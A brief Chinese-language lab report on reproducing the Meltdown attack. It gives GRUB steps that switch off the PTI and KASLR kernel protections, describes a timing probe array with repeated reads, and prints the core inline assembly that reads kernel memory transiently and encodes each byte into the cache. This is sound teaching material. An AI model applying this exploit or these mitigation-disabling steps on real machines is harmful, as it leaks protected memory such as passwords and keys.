# Lab04
## 实现流程
1. 首先进行检查，发现内核有PTI补丁。

2. 关闭PTI补丁，在/boot/grub/grub.cfg中找到linux /boot/vmlinuz-4.13.0-45-generic.efi.signed root=UUID=..... 后面加上nopti 和 nokaslr。

3. 编写meltdown.c文件进行攻击，撰写MakeFile,可在meltdown.sh脚本中更改参数，之后运行./meltdown.sh脚本即可。

## 关键步骤

1. 设定一个全局数组，用于用来观察哪个值的读取时间快来确认攻击地址的值，在初始和每一次读取结束后都需要用memset清空，最后比较，时间最短者即为读取的字节内容。

2. 重复读取

        for (int i=0;i<1000;i++){
                    score[readbyte(fd,addr)]++;
        }

对每个字节重复读取选可能性最大的值。

3. 仿照原meltdown的Github网站编写主要进行攻击的汇编代码。

        __asm__ volatile (
            ".rept 300\n\t"
            "add $0x141, %%rax\n\t"
            ".endr\n\t"
            "movzx (%[addr]), %%rax\n\t"
                "shl $12, %%rax\n\t"
                "mov (%[target], %%rax, 1), %%rbx\n"
            :
            : [target] "r" (check),
              [addr] "r" (addr)
            : "rax","rbx"
        ); 
